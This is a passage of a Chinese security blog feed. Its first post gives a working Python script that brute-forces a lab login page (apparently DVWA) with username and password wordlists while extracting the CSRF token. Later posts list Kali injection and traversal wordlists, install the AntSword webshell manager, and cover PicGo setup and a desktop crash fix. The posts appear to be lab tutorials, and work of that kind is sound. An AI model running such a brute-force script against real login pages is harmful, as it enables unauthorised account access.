<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817184829997.png" alt="image-20210817184829997"></p>
<p>post请求数据部分就可以下面这样写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;xxxx&#x27;</span>, <span class="comment">#用户名的地方</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;xxxx&#x27;</span>, <span class="comment">#用户密码的地方</span></span><br><span class="line">    <span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_token&#x27;</span>:x[<span class="number">0</span>] <span class="comment"># 随机数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全部代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="comment"># 用Session的get请求</span></span><br><span class="line">ask=r.get(<span class="string">&#x27;http://192.168.192.58/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># findall()他会获得表达式里面的全部内容</span></span><br><span class="line"><span class="comment"># ask.text获得响应的数据的内容</span></span><br><span class="line">x =re.findall(<span class="string">&#x27;\w&#123;32&#125;&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="comment">#用户名的地方</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;password&#x27;</span>, <span class="comment">#用户密码的地方</span></span><br><span class="line">    <span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_token&#x27;</span>:x[<span class="number">0</span>] <span class="comment"># 随机数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  用items()方法将其转化为元组组成的列表, 获得随机数</span></span><br><span class="line">getcookies = ask.cookies.items()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫cookies组合起来</span></span><br><span class="line">Cookies=getcookies[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">0</span>][<span class="number">1</span>]+<span class="string">&#x27;; &#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:Cookies,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># POST请求，headers是请求头，data是数据部分</span></span><br><span class="line">ask=r.post(<span class="string">&#x27;http://192.168.192.58/login.php&#x27;</span>,headers=headers,data=data)</span><br></pre></td></tr></table></figure>
<h2 id="判断登录是否成功"><a href="#判断登录是否成功" class="headerlink" title="判断登录是否成功"></a>判断登录是否成功</h2><p>在登录失败的时候他会返还<code>Login failed</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817183300074.png" alt="image-20210817183300074"></p>
<p>我们就可以通过判断有没有<code>Login failed</code>来实现</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ask.text是post请求后返回的内容，</span></span><br><span class="line"><span class="comment"># findall()他会获得表达式里面的全部内容，如果有Login failed就匹配到Login failed</span></span><br><span class="line">failed =re.findall(<span class="string">&#x27;Login failed&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应为他返回的是列表，所以判断的也是[&#x27;Login failed&#x27;]列表</span></span><br><span class="line"><span class="keyword">if</span> failed != [<span class="string">&#x27;Login failed&#x27;</span>]:</span><br><span class="line">    print(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;破解失败&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>全部代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="comment"># 用Session的get请求</span></span><br><span class="line">ask=r.get(<span class="string">&#x27;http://192.168.192.58/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># findall()他会获得表达式里面的全部内容</span></span><br><span class="line"><span class="comment"># ask.text获得响应的数据的内容</span></span><br><span class="line">x =re.findall(<span class="string">&#x27;\w&#123;32&#125;&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>, <span class="comment">#用户名的地方</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;password&#x27;</span>, <span class="comment">#用户密码的地方</span></span><br><span class="line">    <span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user_token&#x27;</span>:x[<span class="number">0</span>] <span class="comment"># 随机数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#  用items()方法将其转化为元组组成的列表, 获得随机数</span></span><br><span class="line">getcookies = ask.cookies.items()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 叫cookies组合起来</span></span><br><span class="line">Cookies=getcookies[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">0</span>][<span class="number">1</span>]+<span class="string">&#x27;; &#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:Cookies,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST请求，headers是请求头，data是数据部分</span></span><br><span class="line">ask=r.post(<span class="string">&#x27;http://192.168.192.58/login.php&#x27;</span>,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ask.text是post请求后返回的内容，</span></span><br><span class="line"><span class="comment"># findall()他会获得表达式里面的全部内容，如果有Login failed就匹配到Login failed</span></span><br><span class="line">failed =re.findall(<span class="string">&#x27;Login failed&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应为他返回的是列表，所以判断的也是[&#x27;Login failed&#x27;]列表</span></span><br><span class="line"><span class="keyword">if</span> failed != [<span class="string">&#x27;Login failed&#x27;</span>]:</span><br><span class="line">    print(<span class="string">&#x27;登录成功&#x27;</span>)  <span class="comment"># 内容没有Login failed就是登录成功了</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;破解失败&#x27;</span>) <span class="comment"># 有就是登录失败了</span></span><br></pre></td></tr></table></figure>
<p>测试</p>
<p>输入正确的密码</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817191358387.png" alt="image-20210817191358387"></p>
<p>输入错误密码，他就登录失败了说明没有问题</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210817191452482.png" alt="image-20210817191452482"></p>
<h2 id="字典破解"><a href="#字典破解" class="headerlink" title="字典破解"></a>字典破解</h2><p>这个就是文件的读取进行破解就没有什么好说的了</p>
<p>他的文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210818214133596.png" alt="image-20210818214133596"><br>文件内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210818214211415.png" alt="image-20210818214211415"></p>
<p>破解代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开用户字典  errors=&quot;ignore&quot;参数是忽略在读取的错误，应为想0xf1这样的就会报错</span></span><br><span class="line">admin_txt=open(<span class="string">&quot;admin.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>,errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Crack</span>(<span class="params">admin_txt</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用于记录破解次数</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户一行一行获取文件的内容</span></span><br><span class="line">    <span class="keyword">for</span> admin <span class="keyword">in</span> admin_txt:  <span class="comment"># 这个循环一次</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打开密码字典  errors=&quot;ignore&quot;参数是忽略在读取的错误，应为想0xf1这样的就会报错</span></span><br><span class="line">        password_txt = open(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密码一行一行获取文件的内容</span></span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> password_txt: <span class="comment"># 这个要叫文件内容循环完</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 用`Session` 对象维持会话</span></span><br><span class="line">            r=requests.session()</span><br><span class="line">            <span class="comment"># 用Session的get请求</span></span><br><span class="line">            ask=r.get(<span class="string">&#x27;http://192.168.31.122/login.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># findall()他会获得表达式里面的全部内容</span></span><br><span class="line">            <span class="comment"># ask.text获得响应的数据的内容</span></span><br><span class="line">            x =re.findall(<span class="string">&#x27;\w&#123;32&#125;&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="comment"># 应为python读取文件的时候会有换行符，可以用rstrip()方法去掉</span></span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:admin.rstrip(),     <span class="comment">#字典的用户名</span></span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:password.rstrip(),   <span class="comment">#字典的用户密码</span></span><br><span class="line">                <span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;user_token&#x27;</span>:x[<span class="number">0</span>] <span class="comment"># 随机数</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  用items()方法将其转化为元组组成的列表, 获得随机数</span></span><br><span class="line">            getcookies = ask.cookies.items()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 叫cookies组合起来</span></span><br><span class="line">            Cookies=getcookies[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">0</span>][<span class="number">1</span>]+<span class="string">&#x27;; &#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">0</span>]+<span class="string">&#x27;=&#x27;</span>+getcookies[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建请求头</span></span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>:Cookies,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># POST请求，headers是请求头，data是数据部分</span></span><br><span class="line">            ask=r.post(<span class="string">&#x27;http://192.168.31.122/login.php&#x27;</span>,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ask.text是post请求后返回的内容，</span></span><br><span class="line">            <span class="comment"># findall()他会获得表达式里面的全部内容，如果有Login failed就匹配到Login failed</span></span><br><span class="line">            failed =re.findall(<span class="string">&#x27;Login failed&#x27;</span>,ask.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 用来计数</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 应为他返回的是列表，所以判断的也是[&#x27;Login failed&#x27;]列表</span></span><br><span class="line">            <span class="keyword">if</span> failed != [<span class="string">&#x27;Login failed&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 应为python读取文件的时候会有换行符，可以用rstrip()方法去掉</span></span><br><span class="line">                print(str(count)+<span class="string">&#x27;破解成功：用户名&#x27;</span>+admin.rstrip()+<span class="string">&#x27;密码&#x27;</span>+password.rstrip())</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 关闭文件</span></span><br><span class="line">                admin_txt.close()</span><br><span class="line">                password_txt.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 应为python读取文件的时候会有换行符，可以用rstrip()方法去掉</span></span><br><span class="line">                print(str(count)+admin.rstrip()+password.rstrip())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 关闭文件</span></span><br><span class="line">        password_txt.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">Crack(admin_txt)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210818214248118.png" alt="image-20210818214248118"></p>
]]></content>
      <categories>
        <category>脚本编写</category>
        <category>爆破</category>
      </categories>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>kali linux 使用Typora加PicGo</title>
    <url>/2020/12/23/kalilinux%E4%BD%BF%E7%94%A8Typora%E5%8A%A0PicGo/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我物理机就是kali linux已经用了有两年了差不多</strong></p>
<h1 id="下载PicGo-Core"><a href="#下载PicGo-Core" class="headerlink" title="下载PicGo-Core"></a>下载PicGo-Core</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223202830865.png" alt="image-20201223202830865"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223202957453.png" alt="image-20201223202957453"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223203033934.png" alt="image-20201223203033934"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223203053866.png" alt="image-20201223203053866"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223203136274.png" alt="image-20201223203136274"></p>
<h1 id="配置文件内容"><a href="#配置文件内容" class="headerlink" title="配置文件内容"></a>配置文件内容</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;current&quot;</span>: <span class="string">&quot;gitee&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span>: <span class="string">&quot;gitee&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;smms&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;token&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;gitee&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;message&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;gitee的用户名，不是登录的用户名&quot;</span>, <span class="comment">//下面有说明</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span>: <span class="string">&quot;img&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;repo&quot;</span>: <span class="string">&quot;gitee用户名/仓库名&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;token&quot;</span>: <span class="string">&quot;xxxxxxxxxxxxxxxx私人令牌的tokenxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;lastSync&quot;</span>: <span class="string">&quot;2020-09-11 06:40:29&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是gitee的用户名</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223204151986.png" alt="image-20201223204151986"></p>
<p>这个就是用户名<code>gitee用户名/仓库名</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223204336407.png" alt="image-20201223204336407"></p>
<p>这个就是私人令牌</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223204447547.png" alt="image-20201223204447547"></p>
<p><strong>我配置好的</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223204917233.png" alt="image-20201223204917233"></p>
<h1 id="配置好后测试"><a href="#配置好后测试" class="headerlink" title="配置好后测试"></a>配置好后测试</h1><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223205051050.png" alt="image-20201223205051050"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/image-20201223205037052.png" alt="image-20201223205037052"></p>
<p>我们直接叫照片复制到文件里面他自己就上发到服务器上了？</p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 自带的字典文件</title>
    <url>/2019/09/22/kali%E8%87%AA%E5%B8%A6%E7%9A%84%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="在kali有存在的字典文件"><a href="#在kali有存在的字典文件" class="headerlink" title="在kali有存在的字典文件"></a><strong>在kali有存在的字典文件</strong></h2><p>在kali下<code>/usr/share/wfuzz/wordlist</code>不同的类型都放在不同的文件里<br>下面简单介绍一下<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190923154256612.png" alt="在这里插入图片描述"></p>
<ol>
<li>文件一general 里面都是放的是猜网站文件目录的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190923160814227.png" alt="在这里插入图片描述"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">big.txt				 对子目录的爆破的字典</span><br><span class="line">http_methods.txt		http方法的字典</span><br></pre></td></tr></table></figure></li>
<li>文件二Injections进行注入的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190923161514512.png" alt="在这里插入图片描述"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bad_chars.txt 	坏字符字典</span><br><span class="line">SQL.txt进行SQL注入的字典</span><br><span class="line">Traversal.txt 进行远程文件包含和本地文件包含的字典</span><br><span class="line">XML.txt 进行XML注入的字典</span><br><span class="line">XSS.txt进行XSS的字典</span><br></pre></td></tr></table></figure></li>
<li>文件三stress压力测试的</li>
<li>文件四vulns进行文件便利<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirTraversal-nix.txt 	这个文件还是挺大的是进行linux文件便利的</span><br><span class="line">dirTraversal-win.txt 这个文件还是挺大的是进行win文件便利的</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>kali 安装蚁剑</title>
    <url>/2020/12/21/kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我用的是<code>kali linux 2020.4环境是kde</code></strong></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>Github下载<a href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221083734.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221083820.png"></p>
<p>或者用下面这个命令下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;AntSwordProject&#x2F;AntSword-Loader&#x2F;releases&#x2F;download&#x2F;4.0.3&#x2F;AntSword-Loader-v4.0.3-linux-x64.zip</span><br></pre></td></tr></table></figure>
<h2 id="什么是加速器"><a href="#什么是加速器" class="headerlink" title="什么是加速器"></a>什么是加速器</h2><p>从 v2.0.0-beta 版本开始，引入了加载器这一概念。用户/开发者只需要下载对应平台的加载器，无需安装额外的环境，即可对源代码进行编辑/执行/调试等操作。可直接运行当前最新的开发版和发行版源代码。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>叫下载出来的给解压出来</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221084402.png"></p>
<p>我们先创建一个文件应为安装的时候会让你初始化，叫你选择文件<br>注意：初始化的时候目录不能有中文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir  &#x2F;opt&#x2F;AntSword </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221084601.png"></p>
<p>我们进行解压好的文件里面<br>执行下面这个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;AntSword</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221084841.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221084925.png"></p>
<p>这样他就可以安装了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221084945.png"></p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>在解压的目录允许</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;AntSword</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221090057.png"><br>我叫压缩的文件最后放到了，要是你安装想放到那就可以就是初始化的时候目录不能有中文<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221090522.png"></p>
<h2 id="创建一个应用程序"><a href="#创建一个应用程序" class="headerlink" title="创建一个应用程序"></a>创建一个应用程序</h2><p>应为选项不能截图没有办法截图出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221090935.png"></p>
<p>选择图标<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091031.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091122.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091140.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091217.png"></p>
<p>添加命令<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091541.png"></p>
<p>保存<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201221091644.png"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>蚁剑</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>latte-dock崩溃无法启动问题解决</title>
    <url>/2021/01/22/latte-dock/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>我今天我在配置kde的时候突然<code>latte-dock</code>就崩溃了不知道怎么回事，我又重启启动<code>latte-dock</code>还是这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~ # latte-dock --replace                                                             root@kali</span><br><span class="line">Icon theme &quot;OieIcons&quot; not found.</span><br><span class="line">Icon theme &quot;gnome&quot; not found.</span><br><span class="line">Icon theme &quot;Yaru&quot; not found.</span><br><span class="line">free(): double free detected in tcache 2</span><br><span class="line">KCrash: Attempting to start &#x2F;usr&#x2F;bin&#x2F;latte-dock</span><br><span class="line">KCrash: crashing... crashRecursionCounter &#x3D; 2</span><br><span class="line">KCrash: Application Name &#x3D; latte-dock path &#x3D; &#x2F;usr&#x2F;bin pid &#x3D; 2277</span><br><span class="line">KCrash: Arguments: &#x2F;usr&#x2F;bin&#x2F;latte-dock --replace </span><br><span class="line">KCrash: Attempting to start &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libexec&#x2F;drkonqi</span><br><span class="line">Icon theme &quot;OieIcons&quot; not found.</span><br><span class="line">Icon theme &quot;gnome&quot; not found.</span><br><span class="line">Icon theme &quot;Yaru&quot; not found.</span><br><span class="line">Icon theme &quot;OieIcons&quot; not found.</span><br><span class="line">Icon theme &quot;gnome&quot; not found.</span><br><span class="line">Icon theme &quot;Yaru&quot; not found.</span><br><span class="line">[1]  + 2277 suspended (signal)  latte-dock --replace</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210122194114473.png" alt="image-20210122194114473"></p>
<p>然后我就叫电脑重启还是这样啊啊啊啊啊啊啊啊啊，我就在百度，Bing搜索找解决问题，找了很长时间还是不行都没有相关的问题，然后我又去国外的网站去找，有相关的问题但是都没有解决啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊都弄了一下午了</p>
<p>我又叫<code>latte-dock</code>卸载重新安装都是还是不行啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊</p>
<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>我想用着用着怎么就出现这个问题那我就想找一下他的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~ # find &#x2F; -name &quot;latte&quot;                                                 </span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;latte</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;latte</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;qt5&#x2F;qml&#x2F;org&#x2F;kde&#x2F;latte</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210122195221404.png" alt="image-20210122195221404"></p>
<p>文件里面有一个<code>默认.layout.latte</code>文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210122195300476.png" alt="image-20210122195300476"></p>
<p>文件内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210122195434637.png" alt="image-20210122195434637"></p>
<p>可以看见是配置文件我叫这个配置文件删除发现问题就解决了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210122195557922.png" alt="image-20210122195557922"></p>
<p>但是之前配置的<code>latte-dock</code>就没有了</p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>linux私房菜笔记</title>
    <url>/2021/04/10/linux/</url>
